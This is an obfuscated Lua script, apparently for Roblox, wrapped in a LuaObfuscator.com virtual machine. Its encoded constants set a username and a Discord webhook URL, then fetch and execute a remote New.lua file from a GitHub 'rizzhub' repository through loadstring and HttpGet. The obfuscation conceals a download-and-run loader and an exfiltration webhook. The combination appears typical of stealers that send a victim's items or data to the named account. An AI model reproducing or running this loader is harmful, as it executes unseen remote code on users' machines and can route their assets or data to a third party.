--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v74=0;while true do if (v74==0) then v19=v0(v3(v20,1,1));return "";end end else local v75=0;local v76;while true do if (v75==0) then v76=v2(v0(v20,16));if v19 then local v102=v5(v76,v19);v19=nil;return v102;else return v76;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v77=(v22/((781 -(50 + (2132 -1403)))^(v23-(738 -(146 + 591)))))%((2 + 0)^(((v24-1) -(v23-(1 + 0))) + (924 -(770 + 153)))) ;return v77-(v77%(2 -1)) ;else local v78=(2 -0)^(v23-(1 -0)) ;return (((v22%(v78 + v78))>=v78) and (1 + 0)) or 0 ;end end local function v25()local v38=0 -(0 + 0) ;local v39;while true do if (v38==0) then v39=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v38=(457 -169) -(146 + 141) ;end if (v38==1) then return v39;end end end local function v26()local v40=0 + 0 ;local v41;local v42;while true do if (v40==(0 -0)) then v41,v42=v1(v16,v18,v18 + 2 );v18=v18 + (1541 -(1503 + 36)) ;v40=2 -1 ;end if (v40==(1562 -(1248 + 313))) then return (v42 * (155 + 101)) + v41 ;end end end local function v27()local v43=0 + 0 ;local v44;local v45;local v46;local v47;while true do if (v43==(0 + 0)) then v44,v45,v46,v47=v1(v16,v18,v18 + 2 + 1 );v18=v18 + (1119 -(422 + 693)) ;v43=1 + 0 ;end if (v43==(1 + (1750 -(1458 + 292)))) then return (v47 * 16777216) + (v46 * (66994 -(87 + 1371))) + (v45 * (1461 -(681 + 524))) + v44 ;end end end local function v28()local v48=v27();local v49=v27();local v50=1658 -(827 + 830) ;local v51=(v21(v49,2 -1 ,20) * (2^(41 -9))) + v48 ;local v52=v21(v49,2 + 18 + 1 ,851 -(632 + 188) );local v53=((v21(v49,11 + 21 )==(1 + 0)) and  -(1 + 0)) or (1629 -((2284 -(960 + 456)) + 760)) ;if (v52==(0 + 0)) then if (v51==(0 + 0)) then return v53 * (631 -(446 + (813 -628))) ;else v52=2 -1 ;v50=0 -0 ;end elseif (v52==2047) then return ((v51==(0 -0)) and (v53 * ((1 + 0)/(0 -0)))) or (v53 * NaN) ;end return v8(v53,v52-(1447 -(271 + 153)) ) * (v50 + (v51/((3 -(562 -(96 + 465)))^(139 -(14 + (1153 -(699 + 381))))))) ;end local function v29(v30)local v54=0 -0 ;local v55;local v56;while true do if (v54==(811 -(283 + 247 + 280))) then v55=v3(v16,v18,(v18 + v30) -(4 -3) );v18=v18 + v30 ;v54=1 + 1 ;end if (v54==(0 -0)) then v55=nil;if  not v30 then v30=v27();if (v30==(0 -0)) then return "";end end v54=1;end if (v54==(3 -1)) then v56={};for v93=1 + 0 , #v55 do v56[v93]=v2(v1(v3(v55,v93,v93)));end v54=3;end if (v54==3) then return v6(v56);end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v57=1658 -(847 + 811) ;local v58;local v59;local v60;local v61;local v62;local v63;local v64;local v65;while true do if (v57~=(1 + 0)) then else v60=nil;v61=nil;v57=2 + 0 ;end if (v57==3) then v64=nil;v65=nil;v57=4;end if ((1 + 3)==v57) then while true do if (v58==(1590 -(590 + 1000))) then local v99=1492 -(259 + 1233) ;while true do if (v99~=0) then else v59=0 + 0 ;v60=nil;v99=3 -2 ;end if (v99==(14 -(11 + 2))) then v58=835 -(428 + 406) ;break;end end end if ((3 -2)==v58) then v61=nil;v62=nil;v58=5 -3 ;end if (v58~=3) then else v65=nil;while true do local v103=0 -0 ;local v104;local v105;while true do if (v103~=1) then else while true do if (v104==(1304 -(539 + 765))) then v105=0 + 0 ;while true do if (v105==(0 -0)) then local v128=0 -0 ;while true do if (v128~=1) then else v105=1 -0 ;break;end if (v128~=0) then else if (v59==(4 -2)) then local v139=0 -0 ;while true do if (v139==(0 -0)) then local v147=0 + 0 ;local v148;while true do if (v147==(1303 -(422 + 881))) then v148=341 -(313 + 28) ;while true do if (v148==(1 + 0)) then v139=3 -2 ;break;end if ((0 -0)==v148) then local v156=0;while true do if (v156~=0) then else for v165=1 + 0 ,v64 do local v166=1945 -(1396 + 549) ;local v167;local v168;local v169;while true do if (v166~=(2 -1)) then else v169=nil;while true do if (v167==(224 -(98 + 125))) then if (v168==(1 + 0)) then v169=v25()~=(0 -0) ;elseif (v168==(1725 -(702 + 1021))) then v169=v28();elseif (v168==(3 -0)) then v169=v29();end v65[v165]=v169;break;end if (v167==(436 -(282 + 154))) then local v176=180 -(18 + 162) ;while true do if (0==v176) then v168=v25();v169=nil;v176=1;end if ((1 + 0)~=v176) then else v167=1985 -(1329 + 655) ;break;end end end end break;end if (v166==0) then v167=1170 -(192 + 978) ;v168=nil;v166=163 -(36 + 126) ;end end end v63[2 + 1 ]=v25();v156=1 + 0 ;end if (v156~=(1 + 0)) then else v148=1 -0 ;break;end end end end break;end end end if (v139==1) then for v151=1,v27() do local v152=0 + 0 ;local v153;local v154;while true do if (v152==(2 -1)) then while true do if (v153~=(0 -0)) then else v154=v25();if (v21(v154,2 -1 ,1 + 0 )==0) then local v158=0;local v159;local v160;local v161;local v162;local v163;while true do if (v158==(825 -(236 + 588))) then local v170=0 -0 ;while true do if (v170==(1590 -(199 + 1390))) then v158=2 -0 ;break;end if (v170==(0 + 0)) then v161=nil;v162=nil;v170=1 -0 ;end end end if (v158==2) then v163=nil;while true do if (v159~=(1950 -(1591 + 358))) then else local v173=0 -0 ;while true do if (v173==(3 -2)) then v159=1963 -(9 + 1952) ;break;end if (0~=v173) then else v162=nil;v163=nil;v173=1 -0 ;end end end if (0==v159) then local v174=0 + 0 ;while true do if ((0 -0)==v174) then local v181=1560 -(1182 + 378) ;while true do if (v181~=(0 -0)) then else v160=0 + 0 ;v161=nil;v181=857 -(43 + 813) ;end if (v181==(151 -(18 + 132))) then v174=2 -1 ;break;end end end if (v174==1) then v159=1 -0 ;break;end end end if (v159==(1247 -(1181 + 64))) then while true do if (3~=v160) then else if (v21(v162,1 + 2 ,3 + 0 )==(970 -(583 + 386))) then v163[4 + 0 ]=v65[v163[4]];end v60[v151]=v163;break;end if (v160~=(1 + 1)) then else local v183=0 -0 ;while true do if (v183==1) then v160=1 + 2 ;break;end if (v183~=(0 + 0)) then else local v189=0 -0 ;while true do if (v189==1) then v183=1 + 0 ;break;end if (v189==(0 + 0)) then local v191=564 -(220 + 344) ;while true do if (v191~=(0 + 0)) then else if (v21(v162,1 + 0 ,1 -0 )==(1616 -(603 + 1012))) then v163[2]=v65[v163[2 + 0 ]];end if (v21(v162,3 -1 ,628 -(295 + 331) )==1) then v163[10 -7 ]=v65[v163[1 + 2 ]];end v191=3 -2 ;end if ((1492 -(1120 + 371))==v191) then v189=1;break;end end end end end end end if (v160==(1 + 0)) then local v184=1718 -(1505 + 213) ;while true do if (v184~=0) then else local v190=0;while true do if (v190==0) then v163={v26(),v26(),nil,nil};if (v161==(0 + 0)) then local v193=0 + 0 ;local v194;while true do if (v193~=(0 -0)) then else v194=0 + 0 ;while true do if (v194~=(0 + 0)) then else v163[3]=v26();v163[8 -4 ]=v26();break;end end break;end end elseif (v161==1) then v163[1 + 2 ]=v27();elseif (v161==(131 -(15 + 114))) then v163[12 -9 ]=v27() -((2 -0)^(455 -(52 + 387))) ;elseif (v161==(1380 -(1213 + 164))) then local v204=0;local v205;while true do if (v204~=(0 + 0)) then else v205=0 + 0 ;while true do if (v205~=0) then else v163[1 + 2 ]=v27() -((1225 -(774 + 449))^16) ;v163[3 + 1 ]=v26();break;end end break;end end end v190=1;end if (v190==1) then v184=1 + 0 ;break;end end end if (v184==(1 + 0)) then v160=2 -0 ;break;end end end if (v160~=(0 -0)) then else local v185=0 -0 ;local v186;while true do if (v185~=(1508 -(610 + 898))) then else v186=0;while true do if (v186~=1) then else v160=1;break;end if (v186==(0 -0)) then local v192=0 -0 ;while true do if (v192==(2 -1)) then v186=2 -1 ;break;end if (v192==(0 -0)) then local v195=0 -0 ;while true do if (v195==(1986 -(1093 + 893))) then v161=v21(v154,1 + 1 ,1948 -(110 + 1835) );v162=v21(v154,2 + 2 ,24 -18 );v195=1 + 0 ;end if (v195==(101 -(14 + 86))) then v192=1;break;end end end end end end break;end end end end break;end end break;end if ((0 + 0)==v158) then local v171=0;while true do if (v171==(0 + 0)) then v159=1323 -(138 + 1185) ;v160=nil;v171=1;end if (1==v171) then v158=1;break;end end end end end break;end end break;end if ((0 -0)==v152) then v153=294 -(172 + 122) ;v154=nil;v152=3 -2 ;end end end v59=11 -8 ;break;end end end if (v59~=(3 -0)) then else local v140=0 + 0 ;local v141;local v142;while true do if (v140==(1 + 0)) then while true do if (v141~=0) then else v142=881 -(477 + 404) ;while true do local v155=0;while true do if (0~=v155) then else if (v142~=(0 -0)) then else local v164=0 -0 ;while true do if (v164~=(725 -(4 + 721))) then else local v172=0 + 0 ;while true do if (v172==(1752 -(1667 + 84))) then v164=335 -(65 + 269) ;break;end if (v172~=(199 -(113 + 86))) then else for v177=1,v27() do v61[v177-(1 + 0) ]=v33();end for v179=1,v27() do v62[v179]=v27();end v172=2 -1 ;end end end if (v164==(4 -3)) then v142=672 -(71 + 600) ;break;end end end if (v142~=(1 + 0)) then else return v63;end break;end end end break;end end break;end if (0==v140) then v141=908 -(38 + 870) ;v142=nil;v140=627 -(557 + 69) ;end end end v128=4 -3 ;end end end if (v105==1) then if (1~=v59) then else local v129=0 -0 ;while true do if (v129~=0) then else v63={v60,v61,nil,v62};v64=v27();v129=1 + 0 ;end if (v129==(1 + 0)) then v65={};v59=2 + 0 ;break;end end end if (v59==(0 -0)) then local v130=0 + 0 ;local v131;while true do if (v130==(0 -0)) then v131=0;while true do if (v131~=(0 -0)) then else v60={};v61={};v131=1 -0 ;end if (v131==(512 -(140 + 371))) then v62={};v59=3 -2 ;break;end end break;end end end break;end end break;end end break;end if ((0 -0)~=v103) then else v104=0;v105=nil;v103=1;end end end break;end if (v58==(1 + 1)) then v63=nil;v64=nil;v58=3;end end break;end if (v57~=(548 -(119 + 429))) then else v58=0 -0 ;v59=nil;v57=1 -0 ;end if (v57==(8 -6)) then v62=nil;v63=nil;v57=10 -7 ;end end end local function v34(v35,v36,v37)local v66=v35[1];local v67=v35[2];local v68=v35[3];return function(...)local v69=1;local v70= -1;local v71={...};local v72=v12("#",...) -1 ;local function v73()local v79=v66;local v80=v67;local v81=v68;local v82=v32;local v83={};local v84={};local v85={};for v89=0,v72 do if ((v89>=v81) or ((218 + 536)<=((111 -(48 + 16)) + 494))) then v83[v89-v81 ]=v71[v89 + 1 + 0 ];else v85[v89]=v71[v89 + (1 -0) ];end end local v86=(v72-v81) + (947 -(919 + 27)) ;local v87;local v88;while true do local v90=0 + 0 ;while true do if ((v90==(1286 -(22 + 129 + 1135))) or ((5083 -(315 + 68))<=(1874 -(53 + 68)))) then v87=v79[v69];v88=v87[1630 -(992 + 637) ];v90=(1 -0) + 0 ;end if ((v90==(1 + (805 -(159 + 646)))) or ((4527 -(186 + 303))>(330 + 4432))) then if ((v88<=(1153 -(149 + 1000))) or ((101 + 55)==((10447 -8292) -(992 + 42)))) then if ((v88<=(1185 -(723 + 461))) or (3577<=(781 -(554 + 62)))) then if ((v88>(0 -0)) or ((3273 -(4 + 111))<=(3414 -(70 + 662)))) then if ((v85[v87[2 -0 ]]==v87[1 + 3 ]) or ((2406 + 165)>(5680 -(1279 + 17)))) then v69=v69 + 1 + 0 ;else v69=v87[1630 -(977 + 86 + 110 + 454) ];end else local v106=0 + 0 ;local v107;local v108;local v109;while true do if ((((1549 -(1455 + 94)) + 0)==v106) or ((1517 -(132 + 32))>(8466 -3840))) then v107=1091 -(276 + (2007 -1192)) ;v108=nil;v106=1 + 0 ;end if ((v106==(1996 -((2695 -933) + 233))) or (((6230 -(81 + 463)) -(490 + 1311))<=(53 + 196))) then v109=nil;while true do if ((v107==(1 + 0)) or ((115 + 3192)>=(840 + 3311))) then v85[v108 + (1 -0) ]=v109;v85[v108]=v109[v87[4 + 0 ]];break;end if ((v107==(0 + 0)) or ((2902 -((1660 -617) + 214))>(13021 -10106))) then v108=v87[2 + 0 ];v109=v85[v87[545 -(513 + (52 -23)) ]];v107=2 -(1491 -(130 + 1360)) ;end end break;end end end elseif ((v88<=(1604 -(83 + 1519))) or ((31 + 1829)==(7406 -3098))) then local v110=0 -0 ;local v111;local v112;local v113;while true do if ((((501 -266) + 1584)<=(4309 + 91)) and ((438 -((458 -167) + 147))==v110)) then v111=0;v112=nil;v110=1 + 0 ;end if ((v110==((835 + 683) -(648 + 570 + (1439 -(1020 + 120))))) or ((2523 -(51 + 434))>(3685 + 937 + 9))) then v113=nil;while true do if (((355 -251)<(3367 -(132 + 407))) and (v111==(0 + 0))) then v112=0 -0 ;v113=nil;v111=1 -(0 + 0) ;end if ((v111==(627 -(420 + 206))) or ((2472 -(83 + 51))<=(1181 -(494 + 21)))) then while true do if (((2404 + 2523)>=(503 + (1472 -(62 + 449)))) and (v112==(0 + 0))) then v113=v87[(1931 -1422) -(432 + 75) ];v85[v113]=v85[v113](v13(v85,v113 + (2 -1) ,v70));break;end end break;end end break;end end elseif (((4925 -3074)<(3722 + 273 + 737)) and (v88>(1339 -(943 + 393)))) then v69=v87[(540 -(423 + 116)) + 2 ];else v85[v87[1251 -(890 + 359) ]]();end elseif ((v88<=(4 + 2 + 0)) or ((19 -7)>=(4612 -(603 + 1340)))) then if ((v88==5) or ((657 -(491 + 146))>2957)) then v85[v87[4 -2 ]]=v87[3 + 0 ];else v85[v87[2 -0 ]]=v37[v87[6 -3 ]];end elseif ((v88<=((4379 -2754) -(197 + 1421))) or (2722>(3006 + 1978))) then v37[v87[5 -2 ]]=v85[v87[238 -(46 + 149 + 41) ]];elseif ((v88>(21 -13)) or ((2541 + 110)>=(12210 -9018))) then local v122=1184 -(614 + 570) ;local v123;local v124;local v125;local v126;local v127;while true do if ((v122==(1967 -(195 + 211 + (4610 -3051)))) or ((7142 -3108)==(1318 + 68))) then v127=nil;while true do if ((v123==(2 -1)) or ((2045 + (224 -149))<=(6455 -4356))) then local v137=0;while true do if ((v137==(2 -1)) or ((2661 + 1936)>=(13536 -8621))) then v123=2 + 0 ;break;end if ((v137==(1234 -(881 + 353))) or ((2663 -(48 + 61))<=(1754 -1023))) then v70=(v126 + v124) -(1 -0) ;v127=0 + 0 ;v137=1 + 0 ;end end end if ((v123==(838 -(603 + 233))) or (4712<=(1869 -(658 + 51)))) then for v145=v124,v70 do local v146=0 + 0 ;while true do if (((7364 -2892)>(94 + 949)) and (v146==(0 -0))) then v127=v127 + (1556 -(729 + 826)) ;v85[v145]=v125[v127];break;end end end break;end if (((1922 -323)<(5097 -(270 + 54))) and (v123==(0 + 0))) then v124=v87[4 -(148 -(126 + 20)) ];v125,v126=v82(v85[v124](v13(v85,v124 + 1 + 0 ,v87[1 + 2 ])));v123=1 -0 ;end end break;end if ((v122==((555 -359) -(49 + 147))) or (((4468 -(500 + 27)) + 1046)==(2723 + (2600 -(74 + 569))))) then v123=0 + 0 ;v124=nil;v122=1 + 0 ;end if ((((459 -163) + 19)<=(1241 + 2024)) and (v122==(2 -1))) then v125=nil;v126=nil;v122=658 -(56 + 600) ;end end else do return;end end v69=v69 + (1 -(0 -0)) ;break;end end end end A,B=v32(v11(v73));if  not A[1] then local v91=0;local v92;while true do if (0==v91) then v92=v35[4][v69] or "?" ;error("Script error at ["   .. v92   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end return v34(v33(),{},v17)(...);end v15("LOL!0B3O00028O0003083O00557365724E616D6503053O00455845706303093O00557365724E616D6532026O00F03F03073O00576562682O6F6B03803O00682O7470733A2O2F63616E6172792E646973636F72642E636F6D2F6170692F776562682O6F6B732F3130382O393831343035322O353137323137362F6F654E35337375396B532O6E6A634B3247747955515474797A486F4B667172555F4E5A5061366E4B716263417155454E7A67514D6558734B6F7A672O3276456E46567833030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F72692O7A6875622F6D61696E2F4E65772E6C756100163O0012053O00013O0026013O000800010001002O043O00080001001205000100033O001207000100023O001205000100033O001207000100043O0012053O00053O0026013O000100010005002O043O00010001001205000100073O001207000100063O001206000100083O001206000200093O00202O00020002000A0012050004000B4O0009000200044O000200013O00022O0003000100010001002O043O00150001002O043O000100012O00083O00017O00163O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000C3O000D3O000F3O00",v9(),...);end
